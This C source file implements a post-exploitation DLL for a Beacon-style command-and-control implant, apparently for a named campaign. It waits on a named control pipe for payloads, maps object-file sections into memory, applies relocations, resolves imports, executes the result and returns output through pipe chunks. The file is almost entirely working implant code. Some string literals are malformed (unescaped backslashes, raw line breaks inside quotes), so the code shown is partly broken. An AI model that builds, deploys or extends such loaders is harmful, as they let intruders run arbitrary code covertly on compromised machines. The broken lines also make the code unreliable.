/* asyncdll.cpp - self-built async-execute postex DLL (2026-11-11 campaign ②).
 *
 * The official arsenal-kit async-execute DLL ships prebuilt-only; its
 * runner contract resisted black-box recovery (C-19). This DLL implements
 * the same semantics on the kit template contract (DLL_POSTEX_ATTACH=4 +
 * lpReserved), so the whole argument protocol is ours.
 *
 * Wire contract (headless asyncx/asyncx2 verbs, unchanged):
 *   lpReserved blob = bof_pack "iiizzb" (LE):
 *     [i32 runOnce][i32 allocType][i32 syscallMethod]
 *     [z threadStart ""][z outputPipe "\\.\pipe\postex_xxxx"][b bofWire]
 *   follow-ups arrive on the CONTROL pipe (bof_pack "zb"):
 *     [z outputPipe][b bofWire]
 *   bofWire (ArtifactBridge.bof_extract):
 *     [i32 bssSize][i32+code][i32+rdata][i32+data][i32+xdata][i32+pdata]
 *     [i32+relocs][i32 entry][i32 argLen][args]
 *   relocs: [i32 siteSec][i16 type][i16 symbol][i32 off][i32 offInSec]
 *     symbol 1027 (dynamic): + [i32 BE len][module\0][i32 BE len][func\0]
 *     symbol 1028: terminator
 *   section codes: 1024 rdata / 1025 data / 1026 text / 1029 xdata /
 *                  1030 pdata / 1031 bss; symbol <1024 = shim-table index
 * Output = kit chunk framing (beacon read_postex_message consumes):
 *   [i32 BE len(4+payload)][i32 BE flags(id|final<<16)][i32 BE type][payload]
 */
#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>

/* kit-contract markers (client patches both) */
volatile const char gPipeName[] = "\\\\.\\pipe\\POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE";
volatile char gPostexArgumentsBuffer[20] = "_POSTEX_ARGUMENTS_";

typedef struct {
	int  exitFunc;
	char key[4];
	char cleanup;
	char pad[3];
	int  maxPacketSize;
	int  userArgumentBufferSize;
} POSTEX_ARGUMENTS;

/* stage trace (C-19 debugging): append-only file log, best effort */
static void eclog(const char * msg) {
	HANDLE f = CreateFileA("C:\Users\Public\asyncdll_trace.txt", FILE_APPEND_DATA, 0, NULL,
	                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE) return;
	WriteFile(f, msg, (DWORD)strlen(msg), NULL, NULL);
	CloseHandle(f);
}

#define DLL_POSTEX_ATTACH 4

/* ---------------- mini LE parser ---------------- */
typedef struct { char * b; int n; } DATAP;
static int dp_int(DATAP * d) { int v = 0; if (d->n >= 4) { v = *(int *)d->b; d->b += 4; d->n -= 4; } return v; }
static int dp_beint(DATAP * d) {
	int v = 0;
	if (d->n >= 4) {
		unsigned char * p = (unsigned char *)d->b;
		v = (p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3];
		d->b += 4; d->n -= 4;
	}
	return v;
}
static short dp_short(DATAP * d) { short v = 0; if (d->n >= 2) { v = *(short *)d->b; d->b += 2; d->n -= 2; } return v; }
static char * dp_lenstr(DATAP * d, int * outlen) {
	int l = dp_int(d);
	char * p = NULL;
	if (l >= 0 && l <= d->n) { p = d->b; d->b += l; d->n -= l; }
	if (outlen) *outlen = p ? l : 0;
	return p;
}
static char * dp_lenstr_be(DATAP * d, int * outlen) {
	int l = dp_beint(d);
	char * p = NULL;
	if (l >= 0 && l <= d->n) { p = d->b; d->b += l; d->n -= l; }
	if (outlen) *outlen = p ? l : 0;
	return p;
}

/* ---------------- output buffering ---------------- */
static char * g_out = NULL;
static int    g_outLen = 0, g_outCap = 0;

static void out_reserve(int more) {
	int nc;
	char * nb;
	if (g_outLen + more <= g_outCap) return;
	nc = g_outCap ? g_outCap * 2 : 4096;
	while (nc < g_outLen + more) nc *= 2;
	nb = (char *)HeapAlloc(GetProcessHeap(), 0, nc);
	if (!nb) return;
	if (g_out) { memcpy(nb, g_out, g_outLen); HeapFree(GetProcessHeap(), 0, g_out); }
	g_out = nb; g_outCap = nc;
}

static void shim_output(int type, const char * data, int length) {
	(void)type;
	out_reserve(length);
	if (!g_out) return;
	memcpy(g_out + g_outLen, data, length);
	g_outLen += length;
}

static void shim_printf(int type, const char * fmt, ...) {
	char buf[2048];
	va_list ap;
	int n;
	va_start(ap, fmt);
	n = _vsnprintf(buf, sizeof(buf) - 1, fmt, ap);
	va_end(ap);
	if (n > 0) shim_output(type, buf, n);
}

/* deliver buffered output through a fresh pipe server in kit chunks */
static BOOL flush_output_pipe(const char * pipeName) {
	HANDLE h;
	DWORD mode = PIPE_READMODE_BYTE;
	POSTEX_ARGUMENTS * pa = (POSTEX_ARGUMENTS *)gPostexArgumentsBuffer;
	int chunkMax = pa->maxPacketSize > 256 ? pa->maxPacketSize - 64 : 1024 * 1024 - 64;
	int tries;

	if (chunkMax < 256) chunkMax = 256;
	h = CreateNamedPipeA(pipeName, PIPE_ACCESS_DUPLEX,
	                     PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, 1,
	                     1024 * 1024, 1024 * 1024, 0, NULL);
	if (h == INVALID_HANDLE_VALUE)
		return FALSE;
	for (tries = 0; tries < 15; tries++) {
		BOOL c = ConnectNamedPipe(h, NULL);
		if (c || GetLastError() == ERROR_PIPE_CONNECTED) break;
		Sleep(1000);
	}
	if (tries >= 15) { CloseHandle(h); return FALSE; }
	SetNamedPipeHandleState(h, &mode, NULL, NULL);
	{
		int off = 0;
		unsigned short cid = 0;
		do {
			int payload = g_outLen - off;
			char hdr[12];
			int lenBE, flagsBE, typeBE;
			unsigned char * p;
			if (payload > chunkMax) payload = chunkMax;
			lenBE = 4 + payload;
			flagsBE = (int)(cid | ((off + payload) >= g_outLen ? 1 << 16 : 0));
			typeBE = 0; /* CALLBACK_OUTPUT */
			p = (unsigned char *)hdr;
			p[0] = (unsigned char)(lenBE >> 24); p[1] = (unsigned char)(lenBE >> 16); p[2] = (unsigned char)(lenBE >> 8); p[3] = (unsigned char)lenBE;
			p[4] = (unsigned char)(flagsBE >> 24); p[5] = (unsigned char)(flagsBE >> 16); p[6] = (unsigned char)(flagsBE >> 8); p[7] = (unsigned char)flagsBE;
			p[8] = (unsigned char)(typeBE >> 24); p[9] = (unsigned char)(typeBE >> 16); p[10] = (unsigned char)(typeBE >> 8); p[11] = (unsigned char)typeBE;
			if (!WriteFile(h, hdr, 12, NULL, NULL)) break;
			if (payload > 0 && !WriteFile(h, g_out + off, payload, NULL, NULL)) break;
			off += payload;
			cid++;
		} while (off < g_outLen);
	}
	FlushFileBuffers(h);
	DisconnectNamedPipe(h);
	CloseHandle(h);
	return TRUE;
}

/* ---------------- mini formatp ---------------- */
typedef struct { char * original; char * self; int length; int size; } formatp;
static void bf_alloc(formatp * f, int sz) {
	f->original = (char *)HeapAlloc(GetProcessHeap(), 0, sz);
	f->self = f->original; f->length = 0; f->size = sz;
	if (f->original) f->original[0] = 0;
}
static void bf_reset(formatp * f) { f->self = f->original; f->length = 0; if (f->original) f->original[0] = 0; }
static void bf_append(formatp * f, const char * t, int len) {
	if (!f->original || len < 0 || f->length + len + 1 > f->size) return;
	memcpy(f->self, t, len); f->self += len; f->length += len; f->self[0] = 0;
}
static void bf_printf(formatp * f, const char * fmt, ...) {
	char buf[1024]; va_list ap; int n;
	va_start(ap, fmt); n = _vsnprintf(buf, sizeof(buf) - 1, fmt, ap); va_end(ap);
	if (n > 0) bf_append(f, buf, n);
}
static char * bf_tostring(formatp * f, int * sz) { if (sz) *sz = f->length; return f->original; }
static void bf_free(formatp * f) { if (f->original) HeapFree(GetProcessHeap(), 0, f->original); f->original = f->self = NULL; f->length = f->size = 0; }
static void bf_int(formatp * f, int v) { char b[16]; _snprintf(b, 15, "%d", v); bf_append(f, b, (int)strlen(b)); }

/* ---------------- args parser (BeaconData*) ---------------- */
typedef struct { char * buffer; int length; int size; } BOFDATA;
static void data_parse(BOFDATA * d, char * b, int s) { d->buffer = b; d->length = d->size = s; }
static int data_int2(BOFDATA * d) { int v = 0; if (d->length >= 4) { v = *(int *)d->buffer; d->buffer += 4; d->length -= 4; } return v; }
static char * data_ptr(BOFDATA * d, int sz) {
	char * p = NULL;
	if (sz > 0 && sz <= d->length) { p = d->buffer; d->buffer += sz; d->length -= sz; }
	return p;
}
static char * data_extract(BOFDATA * d, int * sz) {
	int l = data_int2(d);
	char * p = NULL;
	if (l >= 0 && l <= d->length) { p = d->buffer; d->buffer += l; d->length -= l; }
	if (sz) *sz = p ? l : 0;
	return p;
}
static int shim_wide(char * src, wchar_t * dst, int max) { return MultiByteToWideChar(CP_ACP, 0, src, -1, dst, max); }

/* ---------------- shim table (bapi.txt order, 43 slots) ---------------- */
static void * g_ftable[43];

/* ---------------- mini wire-object loader ---------------- */
enum { SEC_TEXT = 0, SEC_RDATA, SEC_DATA, SEC_BSS, SEC_XDATA, SEC_PDATA, SEC_MAX };

static int run_bof(char * wire, int wireLen) {
	DATAP d, d2;
	char * secs[SEC_MAX];
	int seclen[SEC_MAX];
	int bssSize, entry, argLen, relocLen;
	char * relocs, * args;
	int i;

	d.b = wire; d.n = wireLen;
	memset(secs, 0, sizeof(secs));
	memset(seclen, 0, sizeof(seclen));

	bssSize = dp_int(&d);
	for (i = 0; i < SEC_MAX; i++) {
		if (i == SEC_BSS) break;
		secs[i] = dp_lenstr(&d, &seclen[i]);
	}
	relocs = dp_lenstr(&d, &relocLen);
	entry = dp_int(&d);
	args = dp_lenstr(&d, &argLen);
	if (!secs[SEC_TEXT]) return -1;
	seclen[SEC_BSS] = bssSize > 0 ? bssSize : 1;

	/* allocate + copy */
	for (i = 0; i < SEC_MAX; i++) {
		int sz = i == SEC_BSS ? seclen[SEC_BSS] : (seclen[i] > 0 ? seclen[i] : 1);
		secs[i] = (char *)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!secs[i]) return -2;
		memset(secs[i], 0, sz);
	}
	d2.b = wire; d2.n = wireLen;
	dp_int(&d2);
	for (i = 0; i < SEC_MAX; i++) {
		if (i == SEC_BSS) break;
		{
			int l; char * p = dp_lenstr(&d2, &l);
			if (p && l > 0) memcpy(secs[i], p, l);
		}
	}

	/* ftable */
	memset(g_ftable, 0, sizeof(g_ftable));
	g_ftable[0] = (void *)LoadLibraryA;
	g_ftable[1] = (void *)FreeLibrary;
	g_ftable[2] = (void *)GetProcAddress;
	g_ftable[3] = (void *)GetModuleHandleA;
	g_ftable[4] = (void *)data_parse;
	g_ftable[5] = (void *)data_ptr;
	g_ftable[6] = (void *)data_int2;
	g_ftable[7] = (void *)data_int2;      /* BeaconDataShort tolerated as int */
	g_ftable[9] = (void *)data_extract;
	g_ftable[10] = (void *)bf_alloc;
	g_ftable[11] = (void *)bf_reset;
	g_ftable[12] = (void *)bf_append;
	g_ftable[13] = (void *)bf_printf;
	g_ftable[14] = (void *)bf_tostring;
	g_ftable[15] = (void *)bf_free;
	g_ftable[16] = (void *)bf_int;
	g_ftable[17] = (void *)shim_output;
	g_ftable[18] = (void *)shim_printf;
	g_ftable[30] = (void *)shim_wide;
	/* 8, 19-29, 31-42 unsupported in-process: stay NULL */

	/* relocations */
	{
		DATAP r;
		r.b = relocs; r.n = relocLen;
		while (r.n >= 16) {
			int siteSec = dp_int(&r);
			int rtype = (unsigned short)dp_short(&r);
			int symbol = (unsigned short)dp_short(&r);
			int offset = dp_int(&r);
			int offInSec = dp_int(&r);
			char * siteBase = NULL, * target = NULL;

			if (symbol == 1028) break;
			switch (siteSec) {
				case 1024: siteBase = secs[SEC_RDATA]; break;
				case 1025: siteBase = secs[SEC_DATA]; break;
				case 1026: siteBase = secs[SEC_TEXT]; break;
				case 1029: siteBase = secs[SEC_XDATA]; break;
				case 1030: siteBase = secs[SEC_PDATA]; break;
				case 1031: siteBase = secs[SEC_BSS]; break;
			}
			if (!siteBase || offset < 0) continue;

			if (symbol == 1027) {
				int ml = 0, fl = 0;
				char * mod = dp_lenstr_be(&r, &ml);
				char * fn = dp_lenstr_be(&r, &fl);
				char modbuf[64], fnbuf[160];
				HMODULE hm; FARPROC fp;
				if (!mod || !fn) break;
				if (ml >= (int)sizeof(modbuf)) ml = sizeof(modbuf) - 1;
				memcpy(modbuf, mod, ml); modbuf[ml] = 0;
				if (ml > 0 && modbuf[ml - 1] == 0) ml--; modbuf[ml] = 0;
				if (fl >= (int)sizeof(fnbuf)) fl = sizeof(fnbuf) - 1;
				memcpy(fnbuf, fn, fl); fnbuf[fl] = 0;
				if (fl > 0 && fnbuf[fl - 1] == 0) fl--; fnbuf[fl] = 0;
				hm = LoadLibraryA(modbuf);
				fp = hm ? GetProcAddress(hm, fnbuf) : NULL;
				target = (char *)fp;
				if (!target) {
					memset(siteBase + offset, 0, 8);
					continue;
				}
			} else if (symbol >= 1024 && symbol <= 1031) {
				char * tb = NULL;
				switch (symbol) {
					case 1024: tb = secs[SEC_RDATA]; break;
					case 1025: tb = secs[SEC_DATA]; break;
					case 1026: tb = secs[SEC_TEXT]; break;
					case 1029: tb = secs[SEC_XDATA]; break;
					case 1030: tb = secs[SEC_PDATA]; break;
					case 1031: tb = secs[SEC_BSS]; break;
				}
				if (!tb) continue;
				target = tb + offInSec;
			} else if (symbol < 43) {
				target = (char *)g_ftable[symbol];
				if (!target) {
					memset(siteBase + offset, 0, 8);
					continue;
				}
			} else {
				continue;
			}

			if (rtype == 1) { /* ADDR64 */
				*(long long *)(siteBase + offset) = (long long)(size_t)target;
			} else if (rtype == 2 || rtype == 6) { /* ADDR32 */
				*(int *)(siteBase + offset) = (int)(size_t)target;
			} else if (rtype == 3) { /* ADDR32NB section-relative */
				*(int *)(siteBase + offset) = offInSec;
			} else { /* REL32 family (20 / 4..9) + unknown default */
				int k = (rtype >= 4 && rtype <= 9) ? (rtype - 4) : 0;
				long long next = (long long)(size_t)(siteBase + offset + 4 + k);
				*(int *)(siteBase + offset) = (int)((long long)(size_t)target - next);
			}
		}
	}

	/* execute */
	{
		DWORD old;
		typedef void (*ENTRYFN)(char *, int);
		ENTRYFN fn;
		VirtualProtect(secs[SEC_TEXT], seclen[SEC_TEXT] > 0 ? seclen[SEC_TEXT] : 1, PAGE_EXECUTE_READ, &old);
		fn = (ENTRYFN)(secs[SEC_TEXT] + entry);
		fn(args, argLen);
	}
	return 0;
}

/* ---------------- bg follow-up reader ---------------- */
static int read_next_blob(HANDLE ctrl, char ** pipeOut, char ** bofOut, int * bofLenOut) {
	DWORD avail = 0;
	char * blob;
	DATAP d;
	int pl = 0, bl = 0;
	char * p, * b;
	int tries;

	for (tries = 0; tries < 600; tries++) {
		if (!PeekNamedPipe(ctrl, NULL, 0, NULL, &avail, 0))
			return -1;
		if (avail > 0) break;
		Sleep(1000);
	}
	if (avail <= 0) return -1;

	blob = (char *)HeapAlloc(GetProcessHeap(), 0, avail);
	if (!blob) return -1;
	if (!ReadFile(ctrl, blob, avail, &avail, NULL) || avail <= 0) {
		HeapFree(GetProcessHeap(), 0, blob);
		return -1;
	}
	d.b = blob; d.n = avail;
	p = dp_lenstr(&d, &pl);
	b = p ? dp_lenstr(&d, &bl) : NULL;
	if (!p || pl <= 1 || !b) {
		HeapFree(GetProcessHeap(), 0, blob);
		return -1;
	}
	*pipeOut = (char *)HeapAlloc(GetProcessHeap(), 0, pl);
	memcpy(*pipeOut, p, pl);
	(*pipeOut)[pl - 1] = 0;
	*bofOut = (char *)HeapAlloc(GetProcessHeap(), 0, bl);
	memcpy(*bofOut, b, bl);
	*bofLenOut = bl;
	HeapFree(GetProcessHeap(), 0, blob);
	return 0;
}

/* ---------------- main ---------------- */
static HANDLE g_ctrl = INVALID_HANDLE_VALUE;

static void run_async(LPVOID raw) {
	POSTEX_ARGUMENTS * pa = (POSTEX_ARGUMENTS *)gPostexArgumentsBuffer;
	int blobLen = pa->userArgumentBufferSize;
	DATAP d;
	int runOnce, tl = 0, pl = 0, bl = 0;
	char * pipeName, * bof;

	d.b = (char *)raw;
	d.n = blobLen > 0 ? blobLen : 0x100000;
	runOnce = dp_int(&d);
	dp_int(&d); /* allocType (unused) */
	dp_int(&d); /* syscallMethod (unused) */
	dp_lenstr(&d, &tl); /* threadStart (unused) */
	pipeName = dp_lenstr(&d, &pl);
	bof = dp_lenstr(&d, &bl);
	eclog("st: run_async parsed args\n");
	if (!pipeName || pl <= 1 || !bof) {
		eclog("st: ARG PARSE FAILED\n");
		return;
	}

	{
		char * pn = (char *)HeapAlloc(GetProcessHeap(), 0, pl);
		memcpy(pn, pipeName, pl);
		pn[pl - 1] = 0;
		g_outLen = 0;
		eclog("st: run_bof enter\n");
		run_bof(bof, bl);
		eclog("st: run_bof returned\n");
		eclog("st: flush_output enter\n");
		flush_output_pipe(pn);
		eclog("st: flush_output returned\n");
		HeapFree(GetProcessHeap(), 0, pn);
	}

	if (runOnce) return;

	/* bg: follow-up BOFs arrive on the control connection */
	for (;;) {
		char * pn, * nb;
		int nbl = 0;
		if (read_next_blob(g_ctrl, &pn, &nb, &nbl) != 0)
			break;
		g_outLen = 0;
		run_bof(nb, nbl);
		flush_output_pipe(pn);
		HeapFree(GetProcessHeap(), 0, pn);
		HeapFree(GetProcessHeap(), 0, nb);
	}
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason) {
		case DLL_PROCESS_ATTACH:
			eclog("st: PROCESS_ATTACH enter
");
			DisableThreadLibraryCalls(hinstDLL);
			eclog("st: PROCESS_ATTACH ok
");
			return TRUE;
		case DLL_POSTEX_ATTACH: {
			eclog("st: postex-attach enter\n");
			/* control pipe server on the client-patched name; Beacon's
			 * bundled job registration connects within seconds */
			HANDLE h;
			int tries;
			h = CreateNamedPipeA((LPCSTR)gPipeName, PIPE_ACCESS_DUPLEX,
			                     PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, 1,
			                     1024 * 1024, 1024 * 1024, 0, NULL);
			if (h == INVALID_HANDLE_VALUE) {
			eclog("st: CreateNamedPipeA(control) FAILED\n");
			return FALSE;
		}
			eclog("st: control pipe server up\n");
			for (tries = 0; tries < 15; tries++) {
				BOOL c = ConnectNamedPipe(h, NULL);
				if (c || GetLastError() == ERROR_PIPE_CONNECTED) break;
				Sleep(1000);
			}
			if (tries >= 15) { CloseHandle(h); return FALSE; }
			eclog("st: control client connected\n");
			g_ctrl = h;
			eclog("st: run_async enter\n");
			run_async(lpReserved);
			eclog("st: run_async returned\n");
			FlushFileBuffers(h);
			DisconnectNamedPipe(h);
			CloseHandle(h);
			return TRUE;
		}
		default:
			return TRUE;
	}
}
